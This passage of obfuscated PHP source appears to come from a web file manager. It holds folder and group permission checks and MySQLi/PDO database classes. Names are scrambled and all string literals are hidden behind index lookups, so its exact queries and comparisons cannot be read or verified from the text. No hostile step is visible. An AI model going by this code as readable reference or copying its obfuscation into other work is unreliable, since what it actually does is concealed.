as $İøÌ€) { if (!isset($ØŒ°š™ª[$İøÌ€])) { continue; } $ˆ¡‚ìÇ  = $this->authMake($ØŒ°š™ª[$İøÌ€], $†ÄÉóÙ”); if ($ˆ¡‚ìÇ [$İÆ†ûÛ[540]]) { $î–ÔòÈ® = $ˆ¡‚ìÇ ; break; } } if (!$£ü—ÓƒÅ) { return $î–ÔòÈ®; } if (!$î–ÔòÈ® && $æ¹ë¡±£) { $î–ÔòÈ® = $this->groupAuthInfo($æ¹ë¡±£, $úË´ñÃÂ); } if (!$î–ÔòÈ®) { $åñ’ÂŸ = Model($İÆ†ûÛ[585])->getInfo($úË´ñÃÂ); $æö€¬Û = explode($İÆ†ûÛ[50], trim($åñ’ÂŸ[$İÆ†ûÛ[584]], $İÆ†ûÛ[50])); $æö€¬Û = array_reverse($æö€¬Û); foreach ($æö€¬Û as $’®ÆÙû¯) { if ($’®ÆÙû¯ == $İÆ†ûÛ[228] || $’®ÆÙû¯ == $ˆÓÃ½) { continue; } $à‹ŒìÉÁ = $this->groupRootAuth($’®ÆÙû¯, $†ÄÉóÙ”); if (!$à‹ŒìÉÁ) { continue; } $î–ÔòÈ® = $this->groupAuthInfo($à‹ŒìÉÁ, $’®ÆÙû¯); break; } } if (!$î–ÔòÈ® || $î–ÔòÈ®[$İÆ†ûÛ[488]] <= 0) { $ÒîÇƒ±‡ = $this->authDeepCheck($Ä¼¸ÏÏ“[$İÆ†ûÛ[193]], $†ÄÉóÙ”); if ($ÒîÇƒ±‡) { $î–ÔòÈ® = $ÒîÇƒ±‡; } } return $î–ÔòÈ®; } private function userIsRoot($±ãë‰Õ© = false) { $û•Ö¨Ä„ =& $_SERVER[²Ö÷öõ]; if (!$±ãë‰Õ© && KodUser::isRoot()) { return !0; } $˜ê–Ê—Ü = Model($û•Ö¨Ä„[598])->getInfo($±ãë‰Õ©); $ã“˜·Û = Model($û•Ö¨Ä„[2185])->listData($˜ê–Ê—Ü[$û•Ö¨Ä„[2186]]); if ($ã“˜·Û && $ã“˜·Û[$û•Ö¨Ä„[575]][$û•Ö¨Ä„[2187]] == 1) { return !0; } return !1; } private function sourceAuthInfo($€Û·½Ã) { $šÙÌï¤° =& $_SERVER[²Ö÷öõ]; $†ğåœ¾ = Model($šÙÌï¤°[1428]); $†‹±éæé = $†ğåœ¾->sourceInfo($€Û·½Ã); if (!$†‹±éæé) { return !1; } $†ğåœ¾->groupPathDisplay($†‹±éæé); $ûöœ€—ş = array($†‹±éæé); $ûöœ€—ş = $†ğåœ¾->_listAppendPath($ûöœ€—ş); $†‹±éæé = $ûöœ€—ş[0]; $·¨ß‚’„ = $†‹±éæé[$šÙÌï¤°[582]]; if (isset($†‹±éæé[$šÙÌï¤°[590]])) { $¿Ã‚¦¦ä = explode($šÙÌï¤°[8], trim($†‹±éæé[$šÙÌï¤°[582]], $šÙÌï¤°[8])); array_shift($¿Ã‚¦¦ä); $·¨ß‚’„ = $†‹±éæé[$šÙÌï¤°[588]] . $šÙÌï¤°[2188] . implode($šÙÌï¤°[8], $¿Ã‚¦¦ä); } return array($šÙÌï¤°[494] => $†‹±éæé[$šÙÌï¤°[32]], $šÙÌï¤°[87] => KodIO::make($†‹±éæé[$šÙÌï¤°[193]]), $šÙÌï¤°[2189] => $·¨ß‚’„); } private function groupAuthInfo($Šü‘¹™´, $¸¥½á»˜) { $Ï’áäİÍ =& $_SERVER[²Ö÷öõ]; $®ç†‘ñ£ = Model($Ï’áäİÍ[585])->getInfo($¸¥½á»˜); return array($Ï’áäİÍ[2190] => intval($Šü‘¹™´[$Ï’áäİÍ[487]]), $Ï’áäİÍ[2173] => $Šü‘¹™´, $Ï’áäİÍ[2191] => LNG($Ï’áäİÍ[2192]), $Ï’áäİÍ[2182] => array($Ï’áäİÍ[494] => $®ç†‘ñ£[$Ï’áäİÍ[32]], $Ï’áäİÍ[87] => KodIO::make($®ç†‘ñ£[$Ï’áäİÍ[90]][$Ï’áäİÍ[193]]), $Ï’áäİÍ[2189] => $®ç†‘ñ£[$Ï’áäİÍ[589]])); } protected function groupRootAuth($ÔÓêñî¢, $ÁĞöÛı = false) { $¶¢÷ÀæÓ =& $_SERVER[²Ö÷öõ]; $ÁĞöÛı = $ÁĞöÛı ? $ÁĞöÛı : USER_ID; $´Ü´É²‰ = $ÁĞöÛı . $¶¢÷ÀæÓ[2193] . $ÔÓêñî¢; static $œ„ÕÒß = array(); if (isset($œ„ÕÒß[$´Ü´É²‰])) { return $œ„ÕÒß[$´Ü´É²‰]; } $‹ÙûÂœˆ = Model($¶¢÷ÀæÓ[585])->getInfo($ÔÓêñî¢); $ïğ¾›ŒÛ = $this->userGroupList($ÁĞöÛı); $”¾Ä¹İç = isset($ïğ¾›ŒÛ[$ÔÓêñî¢]) ? $ïğ¾›ŒÛ[$ÔÓêñî¢][$¶¢÷ÀæÓ[487]] : !1; if ($”¾Ä¹İç && Model($¶¢÷ÀæÓ[571])->authCheckAction($”¾Ä¹İç[$¶¢÷ÀæÓ[487]], $¶¢÷ÀæÓ[2001])) { $œ„ÕÒß[$´Ü´É²‰] = $”¾Ä¹İç; return $”¾Ä¹İç; } $ˆø‰Ìø = $this->sourceAuthSelect($‹ÙûÂœˆ[$¶¢÷ÀæÓ[90]][$¶¢÷ÀæÓ[193]]); $ıá¨èÎ“ = $ˆø‰Ìø ? $this->authMake($ˆø‰Ìø, $ÁĞöÛı) : !1; $ª¹™¦Õª = $ıá¨èÎ“ ? $ıá¨èÎ“[$¶¢÷ÀæÓ[540]] : !1; $œ„ÕÒß[$´Ü´É²‰] = $ª¹™¦Õª ? $ª¹™¦Õª : $”¾Ä¹İç; return $œ„ÕÒß[$´Ü´É²‰]; } public function authOwnerApply($†ßÄ‹“©) { $åÂ¾ºş³ =& $_SERVER[²Ö÷öõ]; if (empty($†ßÄ‹“©[$åÂ¾ºş³[487]]) || isset($†ßÄ‹“©[$åÂ¾ºş³[2194]]) && $†ßÄ‹“©[$åÂ¾ºş³[2194]]) { return $†ßÄ‹“©; } if (AuthModel::authCheckRoot($†ßÄ‹“©[$åÂ¾ºş³[487]][$åÂ¾ºş³[488]])) { return $†ßÄ‹“©; } $¹ãøËä = Model($åÂ¾ºş³[1428])->parentLevelArray($†ßÄ‹“©[$åÂ¾ºş³[584]]); $¹ãøËä = array_merge(array($†ßÄ‹“©[$åÂ¾ºş³[193]]), array_reverse($¹ãøËä)); $…ÂÓœÛ = $this->sourceAuthSelect($¹ãøËä); $ÕÃÓ¸Šˆ = array(); $¡š±»ÉÏ = array(); foreach ($…ÂÓœÛ as $õ€Ùª => $ô¦”Ù) { $¿·ñêè = $this->authFolderOwnerUser($ô¦”Ù); $ÕÃÓ¸Šˆ[$õ€Ùª] = $¿·ñêè; $¡š±»ÉÏ = array_merge($¡š±»ÉÏ, $¿·ñêè[$åÂ¾ºş³[662]]); if ($¿·ñêè[$åÂ¾ºş³[2195]]) { break; } } if (count($¡š±»ÉÏ) == 0) { $¡š±»ÉÏ = $this->authFolderOwnerGroup($†ßÄ‹“©[$åÂ¾ºş³[569]]); } $¡š±»ÉÏ = array_unique($¡š±»ÉÏ); if (AuthModel::authCheckRoot($†ßÄ‹“©[$åÂ¾ºş³[487]][$åÂ¾ºş³[488]])) { $¡š±»ÉÏ[] = USER_ID; } $†ßÄ‹“©[$åÂ¾ºş³[487]][$åÂ¾ºş³[2196]] = Model($åÂ¾ºş³[577])->userListInfo($¡š±»ÉÏ); return $†ßÄ‹“©; } private function authFolderOwnerGroup($Ş˜´ÅüÎ) { $üÎ€‹Şù =& $_SERVER[²Ö÷öõ]; $¹¹ó­Ó = Model($üÎ€‹Şù[2074])->where(array($üÎ€‹Şù[1980] => $Ş˜´ÅüÎ))->select(); $¾ë©ëï = array(); if (!$¹¹ó­Ó) { return $¾ë©ëï; } foreach ($¹¹ó­Ó as $›ÄÚÕ£À) { $¡Ãœó§§ = $this->authInfo($›ÄÚÕ£À); if (AuthModel::authCheckRoot($¡Ãœó§§[$üÎ€‹Şù[487]])) { $¾ë©ëï[] = $›ÄÚÕ£À[$üÎ€‹Şù[1780]]; } } return $¾ë©ëï; } private function authFolderOwnerUser($ŒÆ™—¢ï) { $ÂŒ˜Éœ™ =& $_SERVER[²Ö÷öõ]; $œ–Øƒûˆ = array(); $óõÜ¤ÚĞ = !1; foreach ($ŒÆ™—¢ï as $Ã¯¢ÑëÍ) { $íùô§Œ = $this->authInfo($Ã¯¢ÑëÍ); if ($Ã¯¢ÑëÍ[$ÂŒ˜Éœ™[569]] == $ÂŒ˜Éœ™[228]) { $óõÜ¤ÚĞ = !0; } if ($Ã¯¢ÑëÍ[$ÂŒ˜Éœ™[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($íùô§Œ[$ÂŒ˜Éœ™[487]])) { $œ–Øƒûˆ[] = $Ã¯¢ÑëÍ[$ÂŒ˜Éœ™[569]]; } } } return array($ÂŒ˜Éœ™[662] => $œ–Øƒûˆ, $ÂŒ˜Éœ™[2195] => $óõÜ¤ÚĞ); } public function authMake($ùôòæÑ·, $‘è¯¿ÅË = false) { $£»µîÙ¢ =& $_SERVER[²Ö÷öõ]; $ëê—ÚÎƒ = $this->authArrayCheck($ùôòæÑ·, $‘è¯¿ÅË); if ($ëê—ÚÎƒ[$£»µîÙ¢[2197]]) { $ëê—ÚÎƒ[$£»µîÙ¢[2197]] = $this->sourceAuthInfo($ëê—ÚÎƒ[$£»µîÙ¢[2197]]); } return $ëê—ÚÎƒ; } public function authArrayCheck($Ş„æÚœ¨, $¢ÂĞß¹ = false) { $Ğ±î§ï› =& $_SERVER[²Ö÷öõ]; if (!$Ş„æÚœ¨) { return array($Ğ±î§ï›[488] => 0, $Ğ±î§ï›[540] => !1); } $¢ÂĞß¹ = $¢ÂĞß¹ ? $¢ÂĞß¹ : USER_ID; $²×³úşş = 0; $Ü˜Õ•†Ò = 0; $¨†®„¨  = 0; $à‘ôÅ‹³ = 0; $àòÈÜ­ç = 0; $ºôùîËÖ = 0; $À™Ñ†™è = 1000; $£‘åÈÁĞ = 0; $òÁµŠƒ³ = 0; $³™ı˜ü = 0; $÷è‘¥¤ê = 0; $ıê¤ˆµ› = array($Ğ±î§ï›[193] => 0); foreach ($Ş„æÚœ¨ as $ıê¤ˆµ›) { $Õ—êìç = $this->authInfo($ıê¤ˆµ›); if (!$Õ—êìç) { continue; } $æòìØ“ = $ıê¤ˆµ›[$Ğ±î§ï›[569]]; $ù„ŠØùş = intval($Õ—êìç[$Ğ±î§ï›[487]]); if ($ıê¤ˆµ›[$Ğ±î§ï›[190]] == SourceModel::TYPE_USER && $æòìØ“ == $¢ÂĞß¹) { $²×³úşş = !0; $¨†®„¨  = $Õ—êìç; $Ü˜Õ•†Ò = $ù„ŠØùş; } else { if ($ıê¤ˆµ›[$Ğ±î§ï›[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($æòìØ“, $¢ÂĞß¹)) { $à‘ôÅ‹³ = !0; $·Ó•Ñ« = $this->groupStepToUserGroup($æòìØ“, $¢ÂĞß¹); if ($·Ó•Ñ« < $À™Ñ†™è) { $À™Ñ†™è = $·Ó•Ñ«; $àòÈÜ­ç = $ù„ŠØùş; $ºôùîËÖ = $Õ—êìç; $£‘åÈÁĞ = $æòìØ“; } if ($·Ó•Ñ« == $À™Ñ†™è && $ù„ŠØùş >= $àòÈÜ­ç) { $àòÈÜ­ç = $ù„ŠØùş; $ºôùîËÖ = $Õ—êìç; $£‘åÈÁĞ = $æòìØ“; } } else { if ($æòìØ“ == $Ğ±î§ï›[228]) { $òÁµŠƒ³ = !0; $÷è‘¥¤ê = $Õ—êìç; $³™ı˜ü = $ù„ŠØùş; } } } } if ($²×³úşş) { $ëßÁÈ¤÷ = $Ü˜Õ•†Ò; $Õ—êìç = $¨†®„¨ ; $‘¢øÉÆ‰ = LNG($Ğ±î§ï›[2198]); } else { if ($à‘ôÅ‹³) { $ëßÁÈ¤÷ = $àòÈÜ­ç; $Õ—êìç = $ºôùîËÖ; $ÙÈê©‘ = Model($Ğ±î§ï›[585])->getInfo($£‘åÈÁĞ); $‘¢øÉÆ‰ = $Ğ±î§ï›[176] . $ÙÈê©‘[$Ğ±î§ï›[589]] . $Ğ±î§ï›[2199] . LNG($Ğ±î§ï›[2200]); } else { if ($òÁµŠƒ³) { $ëßÁÈ¤÷ = $³™ı˜ü; $Õ—êìç = $÷è‘¥¤ê; $‘¢øÉÆ‰ = LNG($Ğ±î§ï›[2170]); } else { $ëßÁÈ¤÷ = 0; $Õ—êìç = !1; $‘¢øÉÆ‰ = $Ğ±î§ï›[12]; } } } $³ŒÃ™®¨ = array($Ğ±î§ï›[2190] => intval($ëßÁÈ¤÷), $Ğ±î§ï›[2173] => $Õ—êìç, $Ğ±î§ï›[2191] => $‘¢øÉÆ‰, $Ğ±î§ï›[2182] => $ıê¤ˆµ›[$Ğ±î§ï›[193]]); return $³ŒÃ™®¨; } private function groupContainUser($ì–ñ™Œ, $…çşúÌò = false) { return in_array($ì–ñ™Œ, $this->userGroupParents($…çşúÌò)); } private function groupStepToUserGroup($Ø«²‚èÔ, $•†äŒ¢† = false) { $Œœæ°ôÊ =& $_SERVER[²Ö÷öõ]; $æûõÏªŠ = $this->userGroupList($•†äŒ¢†); $Ãœ€Ğ‘ = 1000; $ÊóÙÈòÇ = $GLOBALS[$Œœæ°ôÊ[6]][$Œœæ°ôÊ[92]][$Œœæ°ôÊ[2087]] == 1; $›šò°Î« = $ÊóÙÈòÇ ? 3 : 2; foreach ($æûõÏªŠ as $Ğ²Í®¨™) { if ($Ğ²Í®¨™[$Œœæ°ôÊ[1980]] == $Ø«²‚èÔ) { return 0; } $¨ñŸ¢ = explode($Œœæ°ôÊ[50], trim($Ğ²Í®¨™[$Œœæ°ôÊ[584]], $Œœæ°ôÊ[50])); if ($¨ñŸ¢[0] == $Œœæ°ôÊ[228] && count($¨ñŸ¢) > $›šò°Î«) { $ıĞ±·‚Ğ = array_reverse(array_slice($¨ñŸ¢, $›šò°Î«)); $Ì÷«ú€å = array_search($Ø«²‚èÔ, $ıĞ±·‚Ğ); if ($Ì÷«ú€å !== !1 && $Ì÷«ú€å + 1 <= $Ãœ€Ğ‘) { $Ãœ€Ğ‘ = $Ì÷«ú€å + 1; } } } return $Ãœ€Ğ‘; } private function userGroupList($³‘ˆ¾ùÒ = false) { $™²²‰í¢ =& $_SERVER[²Ö÷öõ]; static $š‹ğ—”º = array(); if (isset($š‹ğ—”º[$³‘ˆ¾ùÒ])) { return $š‹ğ—”º[$³‘ˆ¾ùÒ]; } $ˆıá¢Ò„ = Model($™²²‰í¢[598])->getInfo($³‘ˆ¾ùÒ); $š‹ğ—”º[$³‘ˆ¾ùÒ] = array_to_keyvalue($ˆıá¢Ò„[$™²²‰í¢[2171]], $™²²‰í¢[1980]); return $š‹ğ—”º[$³‘ˆ¾ùÒ]; } public function userGroupParents($äÈãš¾) { $…•øˆÈ™ =& $_SERVER[²Ö÷öõ]; static $¥«…Õâ• = array(); $äÈãš¾ = $äÈãš¾ ? $äÈãš¾ : USER_ID; if (isset($¥«…Õâ•[$äÈãš¾])) { return $¥«…Õâ•[$äÈãš¾]; } $æ’ƒ = $this->userGroupList($äÈãš¾); $ÎæÙÎÑ = array(); $÷ï’Ë“ = $GLOBALS[$…•øˆÈ™[6]][$…•øˆÈ™[92]][$…•øˆÈ™[2087]] == 1; $´·¿ØÏ = $÷ï’Ë“ ? 3 : 2; foreach ($æ’ƒ as $¾ãÀ»à) { $”¤Á¢Ø = array($¾ãÀ»à[$…•øˆÈ™[1980]]); $¬´·øÛŒ = explode($…•øˆÈ™[50], trim($¾ãÀ»à[$…•øˆÈ™[584]], $…•øˆÈ™[50])); if ($¬´·øÛŒ[0] == $…•øˆÈ™[228] && count($¬´·øÛŒ) > $´·¿ØÏ) { $ˆ…‹á„ƒ = array_slice($¬´·øÛŒ, $´·¿ØÏ); $”¤Á¢Ø = array_merge($”¤Á¢Ø, array_reverse($ˆ…‹á„ƒ)); } $ÎæÙÎÑ = array_merge($ÎæÙÎÑ, $”¤Á¢Ø); } $¥«…Õâ•[$äÈãš¾] = array_unique($ÎæÙÎÑ); return $¥«…Õâ•[$äÈãš¾]; } public function authTargetInfoMake($İßğıíø) { $Æ«ó™“â =& $_SERVER[²Ö÷öõ]; $š‘½Ò«µ = array(); $üÔ¿İ« = array(); foreach ($İßğıíø as $óøÃ³Í¡) { if ($óøÃ³Í¡[$Æ«ó™“â[190]] == SourceModel::TYPE_USER) { $š‘½Ò«µ[] = intval($óøÃ³Í¡[$Æ«ó™“â[569]]); } else { if ($óøÃ³Í¡[$Æ«ó™“â[190]] == SourceModel::TYPE_GROUP) { $üÔ¿İ«[] = intval($óøÃ³Í¡[$Æ«ó™“â[569]]); } } } if ($š‘½Ò«µ) { $š‘½Ò«µ = Model($Æ«ó™“â[577])->userListInfo($š‘½Ò«µ); } if ($üÔ¿İ«) { $Ò®É¬• = array($Æ«ó™“â[2072] => array($Æ«ó™“â[492], $üÔ¿İ«)); $üÔ¿İ« = Model($Æ«ó™“â[585])->field($Æ«ó™“â[2201])->where($Ò®É¬•)->select(); $üÔ¿İ« = array_to_keyvalue($üÔ¿İ«, $Æ«ó™“â[1980]); } return array($Æ«ó™“â[2202] => $š‘½Ò«µ, $Æ«ó™“â[2203] => $üÔ¿İ«); } public function authInfo($µ§Ş¬’˜) { $éìùÉ¹Œ =& $_SERVER[²Ö÷öõ]; if ($µ§Ş¬’˜[$éìùÉ¹Œ[2088]]) { $éçƒÑ¬ = Model($éìùÉ¹Œ[571])->listData($µ§Ş¬’˜[$éìùÉ¹Œ[2088]]); if (!$éçƒÑ¬) { return !1; $Æ½›ËÔ = Model($éìùÉ¹Œ[571])->listData(); $å£éè¤ú = array_filter_by_field($Æ½›ËÔ, $éìùÉ¹Œ[487], $éìùÉ¹Œ[228]); return $å£éè¤ú; } $ÎÌ¬˜ûÂ = array_field_key($éçƒÑ¬, array($éìùÉ¹Œ[475], $éìùÉ¹Œ[32], $éìùÉ¹Œ[487], $éìùÉ¹Œ[2003], $éìùÉ¹Œ[2004])); $ÎÌ¬˜ûÂ[$éìùÉ¹Œ[2204]] = $µ§Ş¬’˜; return $ÎÌ¬˜ûÂ; } else { return array($éìùÉ¹Œ[493] => 0, $éìùÉ¹Œ[1986] => $µ§Ş¬’˜[$éìùÉ¹Œ[2148]], $éìùÉ¹Œ[494] => $éìùÉ¹Œ[12], $éìùÉ¹Œ[2003] => $éìùÉ¹Œ[2205]); } } } goto fõƒ¡‘©ß‚; aö‰ƒªá–…: class DbMysqli extends Db { public function __construct($Åèß¨¢Æ = '') { $ˆ¤å¨©á =& $_SERVER[²Ö÷öõ]; if (!extension_loaded($ˆ¤å¨©á[998])) { think_exception(think_lang($ˆ¤å¨©á[14]) . $ˆ¤å¨©á[999]); } if (!empty($Åèß¨¢Æ)) { $this->config = $Åèß¨¢Æ; if (empty($this->config[$ˆ¤å¨©á[17]])) { $this->config[$ˆ¤å¨©á[17]] = $ˆ¤å¨©á[12]; } } } public function connect($‡·„¦´“ = '', $İÌË·¹© = 0) { $æ‰™´û =& $_SERVER[²Ö÷öõ]; if (!isset($this->linkID[$İÌË·¹©])) { if (empty($‡·„¦´“)) { $‡·„¦´“ = $this->config; } $this->linkID[$İÌË·¹©] = new mysqli($‡·„¦´“[$æ‰™´û[972]], $‡·„¦´“[$æ‰™´û[974]], $‡·„¦´“[$æ‰™´û[975]], $‡·„¦´“[$æ‰™´û[21]], $‡·„¦´“[$æ‰™´û[973]] ? intval($‡·„¦´“[$æ‰™´û[973]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Õ×¦ç°Ë = $this->linkID[$İÌË·¹©]->server_version; $this->linkID[$İÌË·¹©]->query($æ‰™´û[976] . think_config($æ‰™´û[977]) . $æ‰™´û[58]); if ($Õ×¦ç°Ë > $æ‰™´û[978]) { $this->linkID[$İÌË·¹©]->query($æ‰™´û[979]); } $this->connected = !0; if (1 != think_config($æ‰™´û[22])) { unset($this->config); } } return $this->linkID[$İÌË·¹©]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ì·ğ½ı«) { $£¤æ¾ïĞ =& $_SERVER[²Ö÷öõ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ì·ğ½ı«; if ($this->queryID) { $this->free(); } think_action_status($£¤æ¾ïĞ[23], 1); think_status($£¤æ¾ïĞ[24]); $this->queryID = $this->_linkID->query($ì·ğ½ı«); if ($this->_linkID->more_results()) { while (($İÁÈˆÅÜ = $this->_linkID->next_result()) != NULL) { $İÁÈˆÅÜ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ë›™ãƒÑ) { $å¾Ïº÷ =& $_SERVER[²Ö÷öõ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ë›™ãƒÑ; if ($this->queryID) { $this->free(); } think_action_status($å¾Ïº÷[25], 1); think_status($å¾Ïº÷[24]); $°Áßã· = $this->_linkID->query($ë›™ãƒÑ); $this->debug(); if (!1 === $°Áßã·) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ä¾ÍÜ¢Œ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Ä¾ÍÜ¢Œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $—Çæñøû = $this->_linkID->rollback(); $this->transTimes = 0; if (!$—Çæñøû) { $this->error(); return !1; } } return !0; } private function getAll() { $¸¿²™ä† = array(); if ($this->numRows > 0) { for ($ë¿§®«š = 0; $ë¿§®«š < $this->numRows; $ë¿§®«š++) { $¸¿²™ä†[$ë¿§®«š] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¸¿²™ä†; } public function getFields($ªëŞ¥Ø”) { $¢©‚ÖÅ“ =& $_SERVER[²Ö÷öõ]; $´‹Ä³Ë¿ = $this->query($¢©‚ÖÅ“[983] . $this->parseKey($ªëŞ¥Ø”)); $Ùšâ‚ô = array(); if ($´‹Ä³Ë¿) { foreach ($´‹Ä³Ë¿ as $¯ä¦Øí => $êæÒÉ®û) { $Ùšâ‚ô[$êæÒÉ®û[$¢©‚ÖÅ“[31]]] = array($¢©‚ÖÅ“[32] => $êæÒÉ®û[$¢©‚ÖÅ“[31]], $¢©‚ÖÅ“[33] => $êæÒÉ®û[$¢©‚ÖÅ“[34]], $¢©‚ÖÅ“[35] => (bool) ($êæÒÉ®û[$¢©‚ÖÅ“[36]] === $¢©‚ÖÅ“[12]), $¢©‚ÖÅ“[37] => $êæÒÉ®û[$¢©‚ÖÅ“[38]], $¢©‚ÖÅ“[39] => strtolower($êæÒÉ®û[$¢©‚ÖÅ“[40]]) == $¢©‚ÖÅ“[41], $¢©‚ÖÅ“[42] => strtolower($êæÒÉ®û[$¢©‚ÖÅ“[43]]) == $¢©‚ÖÅ“[44]); } } return $Ùšâ‚ô; } public function getTables($Í÷œ©ºÎ = '') { $»¸Àà²ã =& $_SERVER[²Ö÷öõ]; $¿Û³èÈ™ = !empty($Í÷œ©ºÎ) ? $»¸Àà²ã[985] . $Í÷œ©ºÎ . $»¸Àà²ã[986] : $»¸Àà²ã[987]; $Ø…¶¢‡‘ = $this->query($¿Û³èÈ™); $ûóâ—úË = array(); if ($Ø…¶¢‡‘) { foreach ($Ø…¶¢‡‘ as $€œµ¿·¯ => $Ñç»–óû) { $ûóâ—úË[$€œµ¿·¯] = current($Ñç»–óû); } } return $ûóâ—úË; } public function replace($Ç‚óËÕ£, $Ç¿éø‡º = array()) { $ÌüÎã¡£ =& $_SERVER[²Ö÷öõ]; foreach ($Ç‚óËÕ£ as $éöá¯´ => $¨û…Ğı®) { $Ü‡ü«ú© = $this->parseValue($¨û…Ğı®); if (is_scalar($Ü‡ü«ú©)) { $­ìŸ‡¼ø[] = $Ü‡ü«ú©; $øİ‰â×¹[] = $this->parseKey($éöá¯´); } } $ÍºíÒø• = $ÌüÎã¡£[988] . $this->parseTable($Ç¿éø‡º[$ÌüÎã¡£[356]]) . $ÌüÎã¡£[989] . implode($ÌüÎã¡£[50], $øİ‰â×¹) . $ÌüÎã¡£[990] . implode($ÌüÎã¡£[50], $­ìŸ‡¼ø) . $ÌüÎã¡£[991]; return $this->execute($ÍºíÒø•); } public function insertAll($™Áí¬Ù¿, $É¡Í‡Ñ˜ = array(), $Şú‹±ì¯ = false) { $ÜÆñ«½€ =& $_SERVER[²Ö÷öõ]; if (!is_array($™Áí¬Ù¿[0])) { return !1; } $Ê•Õì = array_keys($™Áí¬Ù¿[0]); $”Äêµè = array(); foreach ($™Áí¬Ù¿ as $éáèÃ–) { $à¬‚Ş•¿ = array(); foreach ($éáèÃ– as $ÈÑÉÇ¢» => $à÷»È‘¥) { $à÷»È‘¥ = $this->parseValue($à÷»È‘¥); if (is_scalar($à÷»È‘¥)) { $à¬‚Ş•¿[] = $à÷»È‘¥; } } $”Äêµè[] = $ÜÆñ«½€[337] . implode($ÜÆñ«½€[50], $à¬‚Ş•¿) . $ÜÆñ«½€[991]; } array_walk($Ê•Õì, array($this, $ÜÆñ«½€[992])); $»Ä–ÔÓ¸ = $Şú‹±ì¯ ? $ÜÆñ«½€[993] : $ÜÆñ«½€[994]; $«Ù¿±üœ = $»Ä–ÔÓ¸ . $ÜÆñ«½€[995] . $this->parseTable($É¡Í‡Ñ˜[$ÜÆñ«½€[356]]) . $ÜÆñ«½€[989] . implode($ÜÆñ«½€[50], $Ê•Õì) . $ÜÆñ«½€[996] . implode($ÜÆñ«½€[50], $”Äêµè); return $this->execute($«Ù¿±üœ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Õ›˜À =& $_SERVER[²Ö÷öõ]; $this->error = $this->_linkID->errno . $Õ›˜À[4] . $this->_linkID->error; if ($Õ›˜À[12] != $this->queryStr) { $this->error .= LNG($Õ›˜À[48]) . $this->queryStr; } think_trace($this->error, $Õ›˜À[12], $Õ›˜À[49]); return $this->error; } public function escapeString($ğŒß£˜„) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ğŒß£˜„); } else { return addslashes($ğŒß£˜„); } } public function parseKey(&$üñş×ºÌ, $¼øÙì³ = true) { $êÍ÷„— =& $_SERVER[²Ö÷öõ]; if ($¼øÙì³) { $üñş×ºÌ = $this->parseKeyCheck($üñş×ºÌ); } if ($üñş×ºÌ != $êÍ÷„—[220] && !preg_match($êÍ÷„—[997], $üñş×ºÌ)) { $üñş×ºÌ = $êÍ÷„—[461] . trim($üñş×ºÌ, $êÍ÷„—[461]) . $êÍ÷„—[461]; } return $üñş×ºÌ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ğËè°Åö = '') { $ÉÕæçÉÄ =& $_SERVER[²Ö÷öõ]; if (!class_exists($ÉÕæçÉÄ[1000])) { think_exception(think_lang($ÉÕæçÉÄ[14]) . $ÉÕæçÉÄ[1001]); } if (!empty($ğËè°Åö)) { $this->config = $ğËè°Åö; if (empty($this->config[$ÉÕæçÉÄ[17]])) { $this->config[$ÉÕæçÉÄ[17]] = array(); } } } public function connect($ûùİçÜÒ = '', $”Ö›Ëµ = 0) { $ÄŒ©©£ =& $_SERVER[²Ö÷öõ]; if (!isset($this->linkID[$”Ö›Ëµ])) { if (empty($ûùİçÜÒ)) { $ûùİçÜÒ = $this->config; } $©½ùÕôº = !empty($ûùİçÜÒ[$ÄŒ©©£[17]][$ÄŒ©©£[18]]) ? $ûùİçÜÒ[$ÄŒ©©£[17]][$ÄŒ©©£[18]] : $this->pconnect; if ($©½ùÕôº) { $ûùİçÜÒ[$ÄŒ©©£[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$”Ö›Ëµ] = new PDO($ûùİçÜÒ[$ÄŒ©©£[1002]], $ûùİçÜÒ[$ÄŒ©©£[974]], $ûùİçÜÒ[$ÄŒ©©£[975]], $ûùİçÜÒ[$ÄŒ©©£[17]]); } catch (PDOException $¾ÌÊöâ—) { think_exception($¾ÌÊöâ—->getMessage()); } $this->dbType = $this->_getDsnType($ûùİçÜÒ[$ÄŒ©©£[1002]]); if (in_array($this->dbType, array($ÄŒ©©£[1003], $ÄŒ©©£[1004], $ÄŒ©©£[1005], $ÄŒ©©£[1006]))) { think_exception($ÄŒ©©£[1007] . $this->dbType . $ÄŒ©©£[1008] . $this->dbType . $ÄŒ©©£[1009]); } if (!$this->linkID[$”Ö›Ëµ]) { think_exception($ÄŒ©©£[1010]); } try { $this->linkID[$”Ö›Ëµ]->exec($ÄŒ©©£[1011] . think_config($ÄŒ©©£[977])); } catch (Exception $¾ÌÊöâ—) { } $this->connected = !0; if (1 != think_config($ÄŒ©©£[22])) { unset($this->config); } } return $this->linkID[$”Ö›Ëµ]; } public function free() { $this->PDOStatement = null; } public function query($ãÁ«ö®¥, $íˆªÄñ² = array()) { $«Áò˜¡× =& $_SERVER[²Ö÷öõ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ãÁ«ö®¥; if (!empty($íˆªÄñ²)) { $this->queryStr .= $«Áò˜¡×[1012] . print_r($íˆªÄñ², !0) . $«Áò˜¡×[1013]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($«Áò˜¡×[23], 1); think_status($«Áò˜¡×[24]); 